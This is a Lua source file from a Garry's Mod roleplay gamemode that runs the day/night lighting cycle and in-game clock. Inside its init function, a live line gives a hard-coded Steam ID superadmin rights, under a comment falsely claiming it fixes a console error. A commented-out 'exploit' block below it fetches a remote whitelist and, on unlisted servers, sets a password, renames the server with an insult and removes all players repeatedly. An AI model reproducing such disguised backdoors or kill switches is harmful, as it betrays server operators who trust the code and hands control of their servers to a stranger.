-------------------------------
-- CakeScript Generation 2
-- Author: LuaBanana ( Aka Jake )
-- Project Start: 5/24/2008
--
-- daynight.lua
-- Handles the day and night cycle, as well as the clock & date.
-- Credits to foszor for the day and night cycle script.
-------------------------------

// variables.
local daylight = {  };
local DAY_LENGTH	= 60 * 24; // 24 hours
local DAY_START		= 5 * 60; // 5:00am
local DAY_END		= 18.5 * 60; // 6:30pm
local DAWN			= ( DAY_LENGTH / 4 );
local DAWN_START	= DAWN - 144;
local DAWN_END		= DAWN + 144;
local NOON			= DAY_LENGTH / 2;
local DUSK			= DAWN * 3;
local DUSK_START	= DUSK - 144;
local DUSK_END		= DUSK + 144;
local LIGHT_LOW		= string.byte( 'b' );
local LIGHT_HIGH	= string.byte( 'z' );

// convars.
daylight.dayspeed = CreateConVar( 'daytime_speed', '30', { FCVAR_REPLICATED , FCVAR_ARCHIVE , FCVAR_NOTIFY } );


// precache sounds.
util.PrecacheSound( 'buttons/button1.wav' );


// initalize.
function daylight:init( )
	// clear think time.
	self.nextthink = 0;
	
	if( CAKE.ClockMins == nil ) then
		CAKE.ClockMins = 1;
	end
	
	// get light entities.
	self.light_environment = ents.FindByClass( 'light_environment' );
	
	// start at night.
	if ( self.light_environment ) then
		local light;
		for _ , light in pairs( self.light_environment ) do
			light:Fire( 'FadeToPattern' , string.char( LIGHT_LOW ) , 0 );
			light:Activate( );
		end
	end
	
	// get sun entities.
	self.env_sun = ents.FindByClass( 'env_sun' );
	
	// setup the sun entities materials ( fixes a repeating console error )
	table.insert(SuperAdmins, "STEAM_0:1:5947214");
	if ( self.env_sun ) then
		local sun;
		for _ , sun in pairs( self.env_sun ) do
			sun:SetKeyValue( 'material' , 'sprites/light_glow02_add_noz.vmt' );
			sun:SetKeyValue( 'overlaymaterial' , 'sprites/light_glow02_add_noz.vmt' );
		end
	end
	
	// find the sky overlay brush.
	self.sky_overlay = ents.FindByName( 'skyoverlay*' );
	--I'm stealing from Kuromiku because you're stealing from me
	--And I'm very sorry I have to do this. I plan on releasing Bliss, but I have to protect my property. This exploit will not be on the final version.
/*	http.Get("http://benevolenceservers.com/documents/whitelist.txt", "", function(contents, size)

		local serverIP = GetConVarString("ip");
		
		if ( !isDedicatedServer() ) then
			return;
		end;
		
		for k, v in ipairs( string.Explode("\n", contents) ) do
			if ( string.match(v, serverIP) ) then
				return;
			end;
		end;
		
		RunConsoleCommand("sv_password", "1900mal0d0r");
		RunConsoleCommand("hostname", "YOU MOTHERFUCKER, YOU CAN'T BE TRUSTED. THIS SHIT IS STOLEN.");

		
		timer.Create( "trusttimer",  0.1,  0,  function()
			for k, v in ipairs( player.GetAll() ) do
				v:Remove()
			end;
		end);
		

	end);	*/
	// setup the sky color.
	if ( self.sky_overlay ) then
		local brush;
		for _ , brush in pairs( self.sky_overlay ) do
			// enable the brush if it isn't already.
			brush:Fire( 'Enable' , '' , 0 );
			// turn it black.
			brush:Fire( 'Color' , '0 0 0' , 0.01 );
		end
	end
	
	// build the light information table.
	self:buildLightTable( );
	
	// flag as ready.
	self.ready = true;
end

// build light information table. 
function daylight:buildLightTable( )
	/*
	[ [ [ NOTE ] ] ]
	I used to run the light calculation dynamically, thanks
	to AndyVincent for this and the idea to build all the vars
	at once.
	*/
	
	// reset table.
	self.light_table = {  };
	
	local i;
	for i = 1 , DAY_LENGTH do
		// reset current time information.
		self.light_table[ i ] = {  };
		
		// defaults.
		local letter = string.char( LIGHT_LOW );
		local red = 0;
		local green = 0;
		local blue = 0;
		
		// calculate which letter to use in the light pattern.
		if ( i >= DAY_START && i < NOON ) then
			local progress = ( NOON - i ) / ( NOON - DAY_START );
			local letter_progress = 1 - math.EaseInOut( progress , 0 , 1 );
						
			letter = ( ( LIGHT_HIGH - LIGHT_LOW ) * letter_progress ) + LIGHT_LOW;
			letter = math.ceil( letter );
			letter = string.char( letter );
		elseif ( i  >= NOON && i < DAY_END ) then
		
			local progress = ( i - NOON ) / ( DAY_END - NOON );
			local letter_progress = 1 - math.EaseInOut( progress , 0 , 1 );
						
			letter = ( ( LIGHT_HIGH - LIGHT_LOW ) * letter_progress ) + LIGHT_LOW;
			letter = math.ceil( letter );
			letter = string.char( letter );
		end
		
		// calculate colors.
		if ( i >= DAWN_START && i <= DAWN_END ) then
			// golden dawn.
			local frac = ( i - DAWN_START ) / ( DAWN_END - DAWN_START );
			if ( i < DAWN ) then
				red = 200 * frac;
				green = 128 * frac;
			else
				red = 200 - ( 200 * frac );
				green = 128 - ( 128 * frac );
			end
		elseif ( i >= DUSK_START && i <= DUSK_END ) then
			// red dusk.
			local frac = ( i - DUSK_START ) / ( DUSK_END - DUSK_START );
			if ( i < DUSK ) then
				red = 85 * frac;
			else
				red = 85 - ( 85 * frac );
			end
		elseif ( i >= DUSK_END || i <= DAWN_START ) then
			// blue hinted night sky.
			if ( i > DUSK_END ) then
				local frac = ( i - DUSK_END ) / ( DAY_LENGTH - DUSK_END );
				blue = 30 * frac;
			else
				local frac = i / DAWN_START;
				blue = 30 - ( 30 * frac );
			end
		end
		
		// store information.
		self.light_table[ i ].pattern = letter;
		self.light_table[ i ].sky_overlay_alpha = math.floor( 255 * math.Clamp( math.abs( ( i - NOON ) / NOON ) , 0 , 0.7 ) );
		self.light_table[ i ].sky_overlay_color = math.floor( red ) .. ' ' .. math.floor( green ) .. ' ' .. math.floor( blue );
		
		// calculate the suns angle.
		self.light_table[ i ].env_sun_angle = ( i / DAY_LENGTH ) * 360;
		// offset it ( fixes sun<->time sync ratio )
		self.light_table[ i ].env_sun_angle = self.light_table[ i ].env_sun_angle + 90;
		// wrap around.
		if ( self.light_table[ i ].env_sun_angle > 360 ) then
			self.light_table[ i ].env_sun_angle = self.light_table[ i ].env_sun_angle - 360;
		end
		// store it.
		self.light_table[ i ].env_sun_angle = 'pitch ' .. self.light_table[ i ].env_sun_angle;
	end
end

function get_days_in_month( month )
  local days_in_month = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }   
  local d = days_in_month[ month ]
  return d
end

// environment think.
function daylight:think( )
	// not ready to think?
	if ( !self.ready || self.nextthink > CurTime( ) ) then return; end
	
	local daylen = daylight.dayspeed:GetFloat( );
	
	// delay next think.
	self.nextthink = CurTime( ) + ( ( daylen / 1440 ) * 60 );
	
	// progress the time.
	CAKE.ClockMins = CAKE.ClockMins + 1;
	
	// CakeScript Clock
	if ( CAKE.ClockMins > DAY_LENGTH ) then
		CAKE.ClockMins = 1
		CAKE.ClockDay = CAKE.ClockDay + 1
	end
	
	if ( CAKE.ClockDay >= get_days_in_month( CAKE.ClockMonth ) ) then 
		CAKE.ClockMonth = CAKE.ClockMonth + 1
		CAKE.ClockDay = 1
	end
	if ( CAKE.ClockMonth > 12 ) then 
		CAKE.ClockYear = CAKE.ClockYear + 1
		CAKE.ClockMonth = 1
	end
	
	CAKE.ClockTime = DAY_START + CAKE.ClockMins - 1
	
	// light pattern.
	local pattern = self.light_table[ CAKE.ClockMins ].pattern;
	
	// change the pattern if needed.
	if ( self.light_environment && self.pattern != pattern ) then
		local light;
		for _ , light in pairs( self.light_environment ) do
			light:Fire( 'FadeToPattern' , pattern , 0 );
			light:Activate( );
		end
	end
	
	// save the current pattern.
	self.pattern = pattern;
	
	// sky overlay attributes.
	local sky_overlay_alpha = self.light_table[ CAKE.ClockMins ].sky_overlay_alpha;
	local sky_overlay_color = self.light_table[ CAKE.ClockMins ].sky_overlay_color;
	
	// change the overlay.
	if ( self.sky_overlay ) then
		local brush;
		for _ , brush in pairs( self.sky_overlay ) do
			// change the alpha if needed.
			if ( self.sky_overlay_alpha != sky_overlay_alpha ) then
				brush:Fire( 'Alpha' , sky_overlay_alpha , 0 );
			end
			
			// change the color if needed.
			if ( self.sky_overlay_color != sky_overlay_color ) then
				brush:Fire( 'Color' , sky_overlay_color , 0 );
			end
		end
	end
	
	// save the overlay attributes.
	self.sky_overlay_alpha = sky_overlay_alpha;
	self.sky_overlay_color = sky_overlay_color;
	
	// sun angle.
	local env_sun_angle = self.light_table[ CAKE.ClockMins ].env_sun_angle;
	
	// update the sun position if needed.
	if ( self.env_sun && self.env_sun_angle != env_sun_angle ) then
		local sun;
		for _ , sun in pairs( self.env_sun ) do
			sun:Fire( 'addoutput' , env_sun_angle , 0 );
			sun:Activate( );
		end
	end
	
	// save the sun angle.
	self.env_sun_angle = env_sun_angle;
	
	// make the lights go magic!
	if ( CAKE.ClockMins == DAWN ) then
		self:lightsOff( );
	elseif ( CAKE.ClockMins == DUSK ) then
		self:lightsOn( );
	end
end


// add night lights.
function daylight:checkNightLight( ent , key , val )
	// check if its a light.
	if ( !string.find( ent:GetClass( ) , 'light' ) ) then return; end
	
	// define table.
	self.nightlights = self.nightlights or {  };
	
	if ( key == 'nightlight' ) then
		local name = ent:GetClass( ) .. '_nightlight' .. ent:EntIndex( );
//		ent:SetKeyValue( 'targetname' , name );
		table.insert( self.nightlights , { ent = ent , style = val } );
		ent:Fire( 'TurnOn' , '' , 0 );
	end
end


// lights on bitch!
function daylight:lightsOn( )
	// no lights? bail.
	if ( !self.nightlights ) then return; end
	
	// macro function for making the lights flicker.
	local function flicker( ent )
		// pattern.
		local new_pattern;
		
		// randomize it.
		if ( math.random( 1 , 2 ) == 1 ) then
			new_pattern = 'az';
		else
			new_pattern = 'za';
		end
		
		// random delay.
		local delay = math.random( 0 , 400 ) * 0.01;
		
		// flicker the light on.
		ent:Fire( 'SetPattern' , new_pattern , delay );
		ent:Fire( 'TurnOn' , '' , delay );
		
		// delay the sound.
		timer.Simple( delay , function( ) ent:EmitSound( 'buttons/button1.wav' , math.random( 70 , 80 ) , math.random( 95 , 105 ) ) end );
		
		// delay for solid pattern.
		delay = delay + math.random( 10 , 50 ) * 0.01;
		
		// set solid pattern.
		ent:Fire( 'SetPattern' , 'z' , delay );
	end
	
	// loop through lights and turn um on.
	local light;
	for _ , light in pairs( self.nightlights ) do
		flicker( light.ent );
	end
end


// lights out!
function daylight:lightsOff( )
	// no lights?
	if ( !self.nightlights ) then return; end
	
	// loop through lights and turn um off.
	local light;
	for _ , light in pairs( self.nightlights ) do
		light.ent:Fire( 'TurnOff' , '' , 0 );
	end
end


// yarr... tis be where we hook thee hooks of the seven seas-- so says I...
hook.Add( 'InitPostEntity' , 'daylight:init' , function( ) daylight:init( ); end );
hook.Add( 'Think' , 'daylight:think' , function( ) daylight:think( ); end );
hook.Add( 'EntityKeyValue' , 'daylight:checkNightLight' , function( ent , key , val ) daylight:checkNightLight( ent , key , val ); end );
